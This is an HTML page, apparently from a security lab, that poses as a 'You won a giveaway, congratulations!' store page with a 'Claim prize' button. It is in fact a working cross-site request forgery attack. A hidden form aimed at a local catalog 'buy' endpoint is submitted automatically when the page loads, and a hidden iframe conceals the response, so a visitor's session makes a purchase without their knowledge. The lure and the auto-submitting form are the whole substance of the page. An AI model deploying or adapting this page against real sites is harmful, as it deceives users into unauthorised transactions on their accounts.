<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Store</title>
    <link rel="stylesheet" href="../css/bootstrap.min.css">
    <link rel="stylesheet" href="../css/fontawesome/css/all.min.css">
    <link rel="stylesheet" href="../css/collections-style.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>
<body>
    <!-- Page Loader -->
    <div id="loader-wrapper">
        <div id="loader"></div>
        <div class="loader-section section-left"></div>
        <div class="loader-section section-right"></div>
    </div>
    <nav class="navbar navbar-expand-lg">
        <div class="container-fluid">
            <a class="navbar-brand" href="/">
                <i class="fas fa-film mr-2"></i>
                Store
            </a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                <i class="fas fa-bars"></i>
            </button>
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <ul class="navbar-nav ml-auto mb-2 mb-lg-0">
                <li class="nav-item">
                    <a class="nav-link nav-link-1" href="/">Produtos</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link nav-link-5" href="/">Carrinho</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link nav-link-3 active" aria-current="page" href="/">About</a>
                </li>
                <li class="nav-item">
                    <a style="cursor: pointer;" class="nav-link nav-link-2" href="/">Log Out</a>
                </li>
            </ul>
            </div>
        </div>
    </nav>

    <div class="tm-hero d-flex justify-content-center align-items-center" data-parallax="scroll" data-image-src="../img/html/ua.jpg"></div>

    <!-- CSRF form -->
    <form hidden id="csrf-form" target="csrf-frame" action="http://127.0.0.1:10015/catalog/buy" method="GET">
        <input type="text" name="idimag" value="1" />
    </form>

    <!-- iframe to hide the output of the form -->
    <iframe hidden name="csrf-frame"></iframe>

    <div class="container-fluid tm-mt-60">
        <div class="row mb-4">
            <h2 class="col-12 tm-text-primary">
                You won a giveaway, congratualitions!
            </h2>
        </div>
        <div class="mb-4">
            <button onclick="" style="margin-left: 15px; width: 120px;" class="btn btn-outline-success tm-search-btn" type="submit">
                Claim prize
            </button>
        </div>
    </div> <!-- container-fluid, tm-container-content -->

    <script src="../js/plugins.js"></script>
    <script>
        $(window).on("load", function() {
            $('body').addClass('loaded');
            document.getElementById("csrf-form").submit();
        });
    </script>
</body>
</html>
